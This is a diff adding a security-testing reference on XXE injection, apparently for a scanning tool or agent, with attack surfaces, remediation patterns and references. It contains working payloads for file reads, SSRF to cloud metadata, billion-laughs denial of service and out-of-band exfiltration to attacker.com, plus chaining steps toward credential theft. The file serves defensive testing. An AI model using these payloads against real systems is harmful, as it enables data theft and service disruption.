@@ -1,0 +1,90 @@
+---
+name: xxe
+description: XML External Entity Injection testing covering file read, SSRF, DoS, and XXE via file upload
+category: vulnerabilities
+version: "1.0"
+tags: ["xxe", "xml", "external-entity", "ssrf", "dos", "owasp-a04"]
+applies_to: ["Java", ".NET", "PHP", "Python", "Node.js", "Go", "Ruby", "SAML", "SOAP", "SVG", "Office Open XML"]
+severity: "HIGH"
+confidence_threshold: "HIGH"
+---
+attack_surface:
+  - "XML-based APIs (REST, SOAP, GraphQL)"
+  - "SAML/OIDC metadata and assertions"
+  - "File upload: SVG, Office docs (docx, xlsx, pptx), PDF"
+  - "XML import/export functionality"
+  - "Configuration file parsing"
+  - "Webhook/XML callback handlers"
+  - "RSS/Atom feed processors"
+  - "XMPP/Jabber message handlers"
+
+detection_channels:
+  - "File read: /etc/passwd, C:\\windows\\win.ini in response"
+  - "SSRF: Internal service access via external entity"
+  - "DoS: Billion laughs, quadratic blowup"
+  - "Out-of-band: DNS/HTTP exfiltration"
+  - "Error-based: Parser errors revealing file content"
+  - "Blind XXE: OAST interactions (DNSLOG, Collaborator)"
+
+payload_primitives:
+  basic_file_read:
+    - '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>'
+    - '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///c:/windows/win.ini">]><foo>&xxe;</foo>'
+    - '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/hostname">]><foo>&xxe;</foo>'
+  parameter_entities:
+    - '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM "file:///etc/passwd">%xxe;]><foo/>'
+  ssrf:
+    - '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://127.0.0.1:8080/admin">]><foo>&xxe;</foo>'
+    - '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">]><foo>&xxe;</foo>'
+    - '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://metadata.google.internal/">]><foo>&xxe;</foo>'
+  dos_billion_laughs:
+    - '<?xml version="1.0"?><!DOCTYPE lolz [<!ENTITY lol "lol"><!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;"><!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;"><!ENTITY lol4 "&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;"><!ENTITY lol5 "&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;"><!ENTITY lol6 "&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;"><!ENTITY lol7 "&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;"><!ENTITY lol8 "&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;"><!ENTITY lol9 "&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;">]><lolz>&lol9;</lolz>'
+  oob_exfiltration:
+    - '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://attacker.com/evil.dtd">%xxe;%send;]><foo/>'
+    - '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://attacker.com/xxe.dtd">%xxe;]><foo>&exfil;</foo>'
+  svg_xxe:
+    - '<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><text>&xxe;</text></svg>'
+  office_xml:
+    - '[Content_Types].xml with external entity'
+    - 'word/document.xml with external entity'
+
+false_positive_validation:
+  - "Verify file content in response (root:x:0:0, [fonts], etc.)"
+  - "Confirm SSRF hit via internal service logs"
+  - "Check for DoS via response time / server load"
+  - "Validate OOB callback received (DNSLOG, Collaborator)"
+  - "Test with different parsers (libxml2, Xerces, MSXML, System.Xml)"
+  - "Confirm not false positive from XML parsing errors"
+
+chaining_guidance:
+  - "XXE + SSRF → Cloud metadata access → Credentials"
+  - "XXE + File Read → Source code disclosure → Further vulnerabilities"
+  - "XXE + SAML → Authentication bypass (modify assertions)"
+  - "XXE + SVG Upload → Stored XXE → RCE via LFI"
+  - "XXE + DoS → Service disruption → Business impact"
+  - "Blind XXE + OAST → Data exfiltration without direct output"
+
+remediation_patterns:
+  - "Disable external entity processing: `DocumentBuilderFactory.setFeature(\"http://apache.org/xml/features/disallow-doctype-decl\", true)`"
+  - "Disable DTDs entirely: `setFeature(\"http://xml.org/sax/features/external-general-entities\", false)`"
+  - "Use safe parsers: `defusedxml` (Python), `XmlReader` with `DtdProcessing.Prohibit` (.NET)"
+  - "Validate XML against schema (XSD) before processing"
+  - "Use JSON instead of XML where possible"
+  - "Implement allowlist for allowed protocols (only http/https if needed)"
+  - "Set entity expansion limits (Java: `jdk.xml.entityExpansionLimit`)"
+
+code_locations:
+  - "Search for XML parsing without hardening:"
+  - "  `DocumentBuilderFactory.newInstance().newDocumentBuilder().parse()`"
+  - "  `xml.etree.ElementTree.parse()`, `lxml.etree.parse()`"
+  - "  `XmlDocument.Load()`, `XDocument.Load()`"
+  - "  `SAXParser`, `DOMParser`, `StAX`"
+  - "Find SVG upload handling: `image/svg+xml`"
+  - "Check Office document processing: `docx`, `xlsx`, `pptx` (zip + XML)"
+  - "Identify SAML/OIDC XML processing"
+
+references:
+  - "https://owasp.org/www-project-top-ten/2017/A4_XML_External_Entities_(XXE)"
+  - "https://portswigger.net/web-security/xxe"
+  - "https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XXE%20Injection"
+  - "https://cheatsheetseries.owasp.org/cheatsheets/XML_External_Entity_Prevention_Cheat_Sheet.html"
